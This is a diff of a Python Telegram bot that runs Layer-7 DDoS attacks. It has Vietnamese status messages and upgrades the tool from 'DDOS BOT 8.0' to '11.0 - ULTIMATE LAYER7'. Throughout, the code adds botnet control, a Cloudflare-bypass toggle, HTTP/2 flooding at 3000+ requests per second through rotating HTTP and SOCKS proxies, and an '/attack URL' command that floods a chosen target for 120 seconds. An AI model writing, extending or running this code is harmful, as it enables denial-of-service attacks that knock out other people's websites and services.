     send_telegram(f"""
-▶️ <b>BẮT ĐẦU TẤN CÔNG!</b>
+▶️ <b>BẮT ĐẦU TẤN CÔNG LAYER7!</b>
 🎯 {target['url']}
 🌐 Proxy: {total_proxy}
+🤖 Botnet: {bot_count}
 ⚡ Tốc độ: {REQUESTS_PER_SECOND} req/s
 🧵 Luồng: {THREAD_COUNT}
-⏱ {MAX_RUN_TIME}s
-🛡 RAM Limit: {MAX_RAM_PERCENT}%
+⏱ 120 GIÂY
+🛡 CF Bypass: {CF_BYPASS}
     """, chat_id)
-    
+
+    # Kích hoạt botnet
+    if bot_count > 0:
+        botnet_attack_ultra(target, MAX_RUN_TIME)
+
     proxy_pools = (proxy_http, proxy_socks5, proxy_socks4)
-    worker_count = min(THREAD_COUNT, len(proxy_list) * 2 + 100)
-    
-    with ThreadPoolExecutor(max_workers=worker_count) as executor:
-        futures = []
-        for i in range(worker_count):
-            futures.append(executor.submit(attack_worker_ultra, proxy_pools, target, i))
-        
+    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
+        futures = [executor.submit(attack_worker_lay7, proxy_pools, target) for _ in range(THREAD_COUNT)]
         start = time.time()
         last_report = 0
-        
         while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
             time.sleep(1)
             elapsed = int(time.time() - start)
-            
-            # Tính tốc độ
             if elapsed > 0:
                 with stats_lock:
                     rate = attack_stats['total_requests'] / elapsed
                     if rate > attack_stats['max_speed']:
                         attack_stats['max_speed'] = rate
-            
-            # Báo cáo
             if elapsed - last_report >= 10:
                 last_report = elapsed
                 with stats_lock:
                     total = attack_stats['total_requests']
                     rate = total / max(elapsed, 1)
                     max_speed = attack_stats['max_speed']
-                    ram = psutil.virtual_memory().percent
-                send_telegram(f"⚡ {elapsed}s | {rate:.1f} req/s | Max: {max_speed:.1f} | {total:,} | RAM: {ram}%", chat_id)
-            
-            # Kiểm tra RAM trong khi attack
-            if elapsed % 30 == 0:
-                check_ram_usage()
-                memory_optimize()
-    
+                    cf_bypassed = attack_stats.get('cf_bypassed', 0)
+                send_telegram(f"⚡ {elapsed}s/120s | {rate:.1f} req/s | Max: {max_speed:.1f} | {total:,} | CF: {cf_bypassed}", chat_id)
+
     stop_event.set()
     is_running = False
-    
+    botnet_command_ultra('stop')
     threading.Thread(target=start_cooldown_ultra, daemon=True).start()
-    
+
     with stats_lock:
         total = attack_stats['total_requests']
         success = attack_stats['success_count']
@@ -857,40 +856,46 @@ def run_attack_ultra(target, chat_id):
         elapsed = int(time.time() - attack_stats['start_time'])
         rate = total / max(elapsed, 1)
         max_speed = attack_stats['max_speed']
-        ram = psutil.virtual_memory().percent
-    
+        cf_bypassed = attack_stats.get('cf_bypassed', 0)
     send_telegram(f"""
 ⏹️ <b>ĐÃ DỪNG SAU {elapsed}s</b>
 📊 Tổng: {total:,} | ✅ {success:,} | ❌ {fail:,}
 📈 Tốc độ: {rate:.1f} req/s | ⚡ Max: {max_speed:.1f}
-🛡 RAM: {ram}% | 💾 Đã tối ưu
+🛡 CF Bypass: {cf_bypassed}
+🤖 Botnet: {bot_count} bots
     """, chat_id)
 
 # =====================================================
-# TELEGRAM LISTENER - TỐI ƯU
+# TELEGRAM LISTENER
 # =====================================================
 def telegram_listener_ultra():
-    global is_running, attack_thread, THREAD_COUNT, REQUESTS_PER_SECOND
+    global is_running, attack_thread, THREAD_COUNT, REQUESTS_PER_SECOND, botnet_running
     last_update_id = 0
-    
+
     send_telegram("""
-🚀 <b>DDOS BOT 8.0 - ULTIMATE EDITION</b>
+🚀 <b>DDOS BOT 11.0 - ULTIMATE LAYER7</b>
 ✅ Đã khởi động!
-⚡ Tốc độ: 2000+ req/s
-🛡 Chống tràn RAM tự động
-📌 Hỗ trợ HTTP/HTTPS/HTTP2
+⚡ Tốc độ: 3000+ req/s
+🛡 CF Bypass: ĐÃ BẬT
+📌 HTTP/2 + BOTNET
+⏱ Mỗi lệnh: 120 GIÂY
 
 📋 LỆNH:
-<code>/attack URL</code> - Tấn công
+<code>/attack URL</code> - Tấn công 120s
 <code>/stop</code> - Dừng
 <code>/status</code> - Trạng thái
 <code>/proxy</code> - Số proxy
-<code>/threads N</code> - Đổi luồng (max 2000)
-<code>/speed N</code> - Đổi tốc độ (max 2000)
-<code>/ram</code> - Xem RAM
+<code>/botnet</code> - Botnet status
+<code>/threads N</code> - Đổi luồng
+<code>/speed N</code> - Đổi tốc độ
+<code>/cf</code> - Bật/tắt CF Bypass
 <code>/help</code> - Trợ giúp
     """)
-    
+
+    # Khởi động botnet
+    botnet_running = True
+    threading.Thread(target=botnet_worker_ultra, daemon=True).start()
+
     while True:
         try:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
@@ -904,17 +909,16 @@ def telegram_listener_ultra():
                         chat_id = msg.get('chat', {}).get('id')
                         if not chat_id:
                             continue
-                        
-                        # Xử lý file proxy
+
                         document = msg.get('document')
                         if document and document.get('file_name', '').endswith('.txt'):
                             handle_proxy_file_ultra(document['file_id'], document['file_name'], chat_id)
-                        
+
                         text = msg.get('text', '').strip()
                         if not text:
                             continue
                         cmd = text.lower()
-                        
+
                         if cmd.startswith('/attack'):
                             parts = text.split(maxsplit=1)
                             if len(parts) >= 2:
@@ -928,15 +932,16 @@ def telegram_listener_ultra():
                                     attack_thread.start()
                             else:
                                 send_telegram("❌ /attack [URL] hoặc [IP:PORT]", chat_id)
-                        
+
                         elif cmd == '/stop':
                             if is_running:
                                 stop_event.set()
                                 is_running = False
-                                send_telegram("⛔ Đã dừng!", chat_id)
+                                botnet_command_ultra('stop')
+                                send_telegram("⛔ Đã dừng tấn công!", chat_id)
                             else:
                                 send_telegram("ℹ️ Không có đợt tấn công nào đang chạy.", chat_id)
-                        
+
                         elif cmd == '/status':
                             with stats_lock:
                                 total = attack_stats['total_requests']
@@ -945,32 +950,37 @@ def telegram_listener_ultra():
                                 elapsed = int(time.time() - attack_stats['start_time']) if attack_stats['start_time'] > 0 else 0
                                 rate = total / max(elapsed, 1)
                                 max_speed = attack_stats.get('max_speed', 0)
-                                ram = psutil.virtual_memory().percent
+                                cf_bypassed = attack_stats.get('cf_bypassed', 0)
                                 uptime = int(time.time() - bot_start_time)
                                 uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
+                                bot_count = len(bots)
                             send_telegram(f"""
-📊 <b>STATUS</b>
+📊 <b>STATUS - LAYER7</b>
 ⏱ Uptime: {uptime_str}
 📨 {total:,} | ✅ {success:,} | ❌ {fail:,}
 📈 {rate:.1f} req/s | ⚡ Max: {max_speed:.1f}
+🛡 CF Bypass: {cf_bypassed}
 🌐 Proxy: {len(proxy_list)}
-🛡 RAM: {ram}%
+🤖 Botnet: {bot_count} bots
 🧵 Luồng: {THREAD_COUNT}
 ⚡ Speed: {REQUESTS_PER_SECOND} req/s
+⏱ 120s Mode
                             """, chat_id)
-                        
+
                         elif cmd == '/proxy':
                             send_telegram(f"🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)} | Tổng: {len(proxy_list)}", chat_id)
-                        
-                        elif cmd == '/ram':
-                            ram = psutil.virtual_memory()
+
+                        elif cmd == '/botnet':
+                            bot_count = len(bots)
+                            active_bots = sum(1 for b in bots.values() if b.get('status') == 'attacking')
                             send_telegram(f"""
-🛡 <b>THÔNG TIN RAM</b>
-📊 Đã dùng: {ram.percent}%
-💾 Đã dùng: {ram.used // (1024**3)} GB / {ram.total // (1024**3)} GB
-⚡ Giới hạn: {MAX_RAM_PERCENT}%
+🤖 <b>BOTNET STATUS</b>
+📊 Tổng bots: {bot_count}
+🟢 Đang tấn công: {active_bots}
+🟡 Idle: {bot_count - active_bots}
+⏱ Heartbeat: {BOTNET_HEARTBEAT}s
                             """, chat_id)
-                        
+
                         elif cmd.startswith('/threads'):
                             try:
                                 new_count = int(text.split()[1])
@@ -981,7 +991,7 @@ def telegram_listener_ultra():
                                     send_telegram("❌ Từ 1-3000", chat_id)
                             except:
                                 send_telegram("❌ /threads <số>", chat_id)
-                        
+
                         elif cmd.startswith('/speed'):
                             try:
                                 new_speed = int(text.split()[1])
@@ -992,33 +1002,33 @@ def telegram_listener_ultra():
                                     send_telegram("❌ Từ 1-3000", chat_id)
                             except:
                                 send_telegram("❌ /speed <số>", chat_id)
-                        
+
+                        elif cmd == '/cf':
+                            global CF_BYPASS
+                            CF_BYPASS = not CF_BYPASS
+                            send_telegram(f"🛡 CF Bypass: {'ĐÃ BẬT' if CF_BYPASS else 'ĐÃ TẮT'}", chat_id)
+
                         elif cmd == '/help':
                             send_telegram("""
-<b>🤖 DDOS BOT 8.0 - ULTIMATE EDITION</b>
+<b>🤖 DDOS BOT 11.0 - ULTIMATE LAYER7</b>
+
+⚡ <b>TỐI ƯU:</b>
+- 3000+ req/s
+- 3000 luồng tối đa
+- HTTP/2 + BOTNET
+- CF Bypass
+- 120s mỗi lệnh
 
 📋 <b>LỆNH:</b>
-<code>/attack URL</code> - Tấn công
+<code>/attack URL</code> - Tấn công 120s
 <code>/stop</code> - Dừng
 <code>/status</code> - Trạng thái
 <code>/proxy</code> - Số proxy
-<code>/ram</code> - Xem RAM
+<code>/botnet</code> - Botnet status
 <code>/threads N</code> - Đổi luồng
 <code>/speed N</code> - Đổi tốc độ
+<code>/cf</code> - Bật/tắt CF Bypass
 <code>/help</code> - Trợ giúp
-
-⚡ <b>TỐI ƯU:</b>
-- 2000+ req/s
-- 3000 luồng tối đa
-- Chống tràn RAM tự động
-- HTTP/HTTPS/HTTP2
-- Nhận proxy siêu tốc
-- Auto scale
-
-🛡 <b>CHỐNG TRÀN RAM:</b>
-- Tự động restart khi RAM > 85%
-- Tối ưu bộ nhớ định kỳ
-- Giới hạn request mỗi worker
                             """, chat_id)
             time.sleep(2)
         except:
@@ -1030,7 +1040,15 @@ def telegram_listener_ultra():
 def auto_reload_proxy_ultra():
     while True:
         time.sleep(600)
-        update_proxy_list_ultra()
+        http, socks5, socks4 = load_proxy_backup_ultra()
+        if len(http) + len(socks5) + len(socks4) > 0:
+            with proxy_lock:
+                global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
+                proxy_http = http
+                proxy_socks5 = socks5
+                proxy_socks4 = socks4
+                proxy_list = http + socks5 + socks4
+                proxy_update_time = time.time()
 
 # =====================================================
 # HEARTBEAT
@@ -1045,13 +1063,13 @@ def heartbeat_loop_ultra():
                 total = attack_stats['total_requests']
                 uptime = int(time.time() - bot_start_time)
                 uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
-                ram = psutil.virtual_memory().percent
+                bot_count = len(bots)
             send_telegram(f"""
 ❤️ HEARTBEAT #{heartbeat_count}
 ⏱ Uptime: {uptime_str}
 📨 Tổng req: {total:,}
 🌐 Proxy: {len(proxy_list)}
-🛡 RAM: {ram}%
+🤖 Botnet: {bot_count} bots
 ⚡ Tốc độ: {REQUESTS_PER_SECOND} req/s
             """)
 
@@ -1076,16 +1094,18 @@ web_app = Flask(__name__)
 
 @web_app.route('/')
 def home():
-    ram = psutil.virtual_memory().percent
+    bot_count = len(bots)
     return jsonify({
-        'status': 'DDOS Bot 8.0 - Ultimate Edition',
+        'status': 'DDOS Bot 11.0 - Ultimate Layer7',
         'uptime': int(time.time() - bot_start_time),
         'proxy_count': len(proxy_list),
         'threads': THREAD_COUNT,
         'speed': REQUESTS_PER_SECOND,
         'is_attacking': is_running,
         'total_requests': attack_stats['total_requests'],
-        'ram_usage': ram
+        'botnet_bots': bot_count,
+        'cf_bypassed': attack_stats.get('cf_bypassed', 0),
+        'max_speed': attack_stats.get('max_speed', 0)
     })
 
 @web_app.route('/health')
@@ -1094,7 +1114,8 @@ def health():
 
 @web_app.route('/stats')
 def stats():
-    ram = psutil.virtual_memory()
+    bot_count = len(bots)
+    active_bots = sum(1 for b in bots.values() if b.get('status') == 'attacking')
     return jsonify({
         'uptime': int(time.time() - bot_start_time),
         'proxy_count': len(proxy_list),
@@ -1104,9 +1125,10 @@ def stats():
         'total_requests': attack_stats['total_requests'],
         'success_count': attack_stats['success_count'],
         'fail_count': attack_stats['fail_count'],
-        'ram_usage': ram.percent,
-        'ram_used': ram.used,
-        'ram_total': ram.total
+        'max_speed': attack_stats.get('max_speed', 0),
+        'botnet_bots': bot_count,
+        'botnet_active': active_bots,
+        'cf_bypassed': attack_stats.get('cf_bypassed', 0)
     })
 
 def run_web_server_ultra():
@@ -1118,52 +1140,38 @@ def run_web_server_ultra():
 # =====================================================
 if __name__ == "__main__":
     bot_start_time = time.time()
-    PROXY_BACKUP_FILE = "proxy_backup.json"
-    
+
     # Load proxy
     http, socks5, socks4 = load_proxy_backup_ultra()
     if len(http) + len(socks5) + len(socks4) > 0:
         proxy_http, proxy_socks5, proxy_socks4 = http, socks5, socks4
         proxy_list = http + socks5 + socks4
         proxy_update_time = time.time()
-        with open('proxies.txt', 'w', encoding='utf-8') as f:
-            f.write(f"# Proxy - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"# Total: {len(proxy_list)}\n\n")
-            for p in proxy_list:
-                if p.get('raw'):
-                    f.write(p['raw'] + '\n')
-        print(f"[+] Loaded {len(proxy_list)} proxies from backup")
+        print(f"[+] Loaded {len(proxy_list)} proxies")
     elif os.path.exists("proxies.txt"):
-        http, socks5, socks4 = load_proxies_ultra("proxies.txt")
-        if len(http) + len(socks5) + len(socks4) > 0:
-            proxy_http, proxy_socks5, proxy_socks4 = http, socks5, socks4
-            proxy_list = http + socks5 + socks4
-            proxy_update_time = time.time()
-            for p in proxy_list:
-                save_proxy_backup_ultra([p])
-            print(f"[+] Loaded {len(proxy_list)} proxies from file")
-    
+        load_proxies_ultra("proxies.txt")
+        time.sleep(2)
+
     print("="*60)
-    print("🔥 DDOS BOT 8.0 - ULTIMATE EDITION")
+    print("🔥 DDOS BOT 11.0 - ULTIMATE LAYER7")
     print("="*60)
     print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
     print(f"[+] Proxy: {len(proxy_list)}")
     print(f"[+] Threads: {THREAD_COUNT}")
     print(f"[+] Speed: {REQUESTS_PER_SECOND} req/s")
-    print(f"[+] RAM Limit: {MAX_RAM_PERCENT}%")
+    print(f"[+] Max Run: {MAX_RUN_TIME}s")
+    print(f"[+] CF Bypass: {CF_BYPASS}")
+    print(f"[+] HTTP/2: {USE_HTTP2}")
     print("="*60)
-    print("[+] BOT READY - MAX SPEED 2000+ REQ/S")
-    print("[+] CHỐNG TRÀN RAM TỰ ĐỘNG")
+    print("[+] BOT READY - 3000+ REQ/S - LAYER7 ULTIMATE")
     print("="*60)
-    
-    # Khởi chạy các thread
+
     threading.Thread(target=run_web_server_ultra, daemon=True).start()
     threading.Thread(target=telegram_listener_ultra, daemon=True).start()
     threading.Thread(target=heartbeat_loop_ultra, daemon=True).start()
     threading.Thread(target=auto_reload_proxy_ultra, daemon=True).start()
-    threading.Thread(target=ram_monitor_loop, daemon=True).start()
     threading.Thread(target=watchdog_ultra, daemon=True).start()
-    
+
     try:
         while True:
             time.sleep(3600)
